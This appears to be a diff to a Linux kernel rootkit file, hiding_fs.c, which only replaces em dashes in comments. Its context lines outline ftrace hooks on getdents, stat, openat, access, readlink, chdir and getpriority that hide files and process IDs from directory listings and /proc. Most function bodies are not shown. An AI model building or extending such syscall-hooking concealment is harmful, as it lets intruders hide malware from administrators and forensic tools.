@@ -1,11 +1,11 @@
-/* hiding_fs.c — Filesystem-level hiding: directory entries, stat, open, chdir, readlink.
+/* hiding_fs.c   Filesystem-level hiding: directory entries, stat, open, chdir, readlink.
  *
  * Merged from Singularity:
- *   hiding_directory.c  — getdents64/getdents filtering
- *   hiding_stat.c       — stat/lstat/statx/newfstatat nlink adjustment
- *   open.c              — openat/access/faccessat proc path blocking
- *   hiding_chdir.c      — chdir blocking
- *   hiding_readlink.c   — readlink blocking
+ *   hiding_directory.c    getdents64/getdents filtering
+ *   hiding_stat.c         stat/lstat/statx/newfstatat nlink adjustment
+ *   open.c                openat/access/faccessat proc path blocking
+ *   hiding_chdir.c        chdir blocking
+ *   hiding_readlink.c     readlink blocking
  *
  * Paths to hide:
  *   1. Static patterns: hidden_patterns[] in hiding_directory_def.h
@@ -102,7 +102,7 @@ static notrace bool should_hide_name(const char *name)
 }
 
 /* ════════════════════════════════════════════════════════════════
- * getdents64 / getdents — directory entry filtering
+ * getdents64 / getdents   directory entry filtering
  * ════════════════════════════════════════════════════════════════ */
 
 #ifndef HAVE_LINUX_DIRENT
@@ -190,7 +190,7 @@ static notrace asmlinkage long hook_getdents(const struct pt_regs *regs)
 }
 
 /* ════════════════════════════════════════════════════════════════
- * stat / lstat / statx / newfstatat — nlink adjustment
+ * stat / lstat / statx / newfstatat   nlink adjustment
  * ════════════════════════════════════════════════════════════════ */
 
 static notrace int count_hidden_subdirs(const char __user *pathname_user)
@@ -275,7 +275,7 @@ static notrace void adjust_user_stat_nlink(const char __user *pathname_user,
     }
 }
 
-/* statx(dfd, pathname, flags, mask, buf) — buf = ARG4 */
+/* statx(dfd, pathname, flags, mask, buf)   buf = ARG4 */
 static asmlinkage long (*orig_statx)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_statx(const struct pt_regs *regs)
@@ -294,7 +294,7 @@ static notrace asmlinkage long hook_statx(const struct pt_regs *regs)
     return ret;
 }
 
-/* stat(pathname, statbuf) — statbuf = ARG1 */
+/* stat(pathname, statbuf)   statbuf = ARG1 */
 static asmlinkage long (*orig_stat)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_stat(const struct pt_regs *regs)
@@ -370,7 +370,7 @@ static notrace asmlinkage long hook_newlstat(const struct pt_regs *regs)
     return ret;
 }
 
-/* newfstatat(dfd, pathname, statbuf, flag) — statbuf = ARG2 */
+/* newfstatat(dfd, pathname, statbuf, flag)   statbuf = ARG2 */
 static asmlinkage long (*orig_newfstatat)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_newfstatat(const struct pt_regs *regs)
@@ -389,7 +389,7 @@ static notrace asmlinkage long hook_newfstatat(const struct pt_regs *regs)
     return ret;
 }
 
-/* getpriority(PRIO_PROCESS, pid) — hide pid */
+/* getpriority(PRIO_PROCESS, pid)   hide pid */
 static asmlinkage long (*orig_getpriority)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_getpriority(const struct pt_regs *regs)
@@ -404,7 +404,7 @@ static notrace asmlinkage long hook_getpriority(const struct pt_regs *regs)
 }
 
 /* ════════════════════════════════════════════════════════════════
- * openat — block /proc/<hidden_pid>/... access
+ * openat   block /proc/<hidden_pid>/... access
  * ════════════════════════════════════════════════════════════════ */
 
 static notrace bool is_hidden_proc_path(const char __user *pathname)
@@ -446,7 +446,7 @@ static notrace bool is_hidden_proc_path(const char __user *pathname)
     return is_hidden_pid(pid);
 }
 
-/* openat(dfd, pathname, ...) — pathname = ARG1 */
+/* openat(dfd, pathname, ...)   pathname = ARG1 */
 static asmlinkage long (*orig_openat)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
@@ -457,7 +457,7 @@ static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
     return orig_openat(regs);
 }
 
-/* readlinkat(dfd, pathname, ...) — pathname = ARG1 */
+/* readlinkat(dfd, pathname, ...)   pathname = ARG1 */
 static asmlinkage long (*orig_readlinkat)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
@@ -468,7 +468,7 @@ static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
     return orig_readlinkat(regs);
 }
 
-/* readlink(pathname, ...) — pathname = ARG0 */
+/* readlink(pathname, ...)   pathname = ARG0 */
 static asmlinkage long (*orig_readlink)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_readlink(const struct pt_regs *regs)
@@ -479,7 +479,7 @@ static notrace asmlinkage long hook_readlink(const struct pt_regs *regs)
     return orig_readlink(regs);
 }
 
-/* access(pathname, mode) — pathname = ARG0 */
+/* access(pathname, mode)   pathname = ARG0 */
 static asmlinkage long (*orig_access)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_access(const struct pt_regs *regs)
@@ -490,7 +490,7 @@ static notrace asmlinkage long hook_access(const struct pt_regs *regs)
     return orig_access(regs);
 }
 
-/* faccessat(dfd, pathname, mode) — pathname = ARG1 */
+/* faccessat(dfd, pathname, mode)   pathname = ARG1 */
 static asmlinkage long (*orig_faccessat)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_faccessat(const struct pt_regs *regs)
@@ -501,7 +501,7 @@ static notrace asmlinkage long hook_faccessat(const struct pt_regs *regs)
     return orig_faccessat(regs);
 }
 
-/* faccessat2(dfd, pathname, mode, flags) — pathname = ARG1 */
+/* faccessat2(dfd, pathname, mode, flags)   pathname = ARG1 */
 static asmlinkage long (*orig_faccessat2)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_faccessat2(const struct pt_regs *regs)
@@ -512,7 +512,7 @@ static notrace asmlinkage long hook_faccessat2(const struct pt_regs *regs)
     return orig_faccessat2(regs);
 }
 
-/* chdir(pathname) — pathname = ARG0 */
+/* chdir(pathname)   pathname = ARG0 */
 static asmlinkage long (*orig_chdir)(const struct pt_regs *);
 
 static notrace asmlinkage long hook_chdir(const struct pt_regs *regs)
@@ -524,7 +524,7 @@ static notrace asmlinkage long hook_chdir(const struct pt_regs *regs)
 }
 
 /* ════════════════════════════════════════════════════════════════
- * Hook table — ARCH_SYS resolves correct prefix per architecture
+ * Hook table   ARCH_SYS resolves correct prefix per architecture
  * ════════════════════════════════════════════════════════════════ */
 
 static struct ftrace_hook fs_hooks[] = {
@@ -551,7 +551,7 @@ static struct ftrace_hook fs_hooks[] = {
 };
 
 /* ════════════════════════════════════════════════════════════════
- * Init / Exit — non-fatal: some syscalls may not exist on all kernels
+ * Init / Exit   non-fatal: some syscalls may not exist on all kernels
  * ════════════════════════════════════════════════════════════════ */
 
 int hiding_fs_init(void)
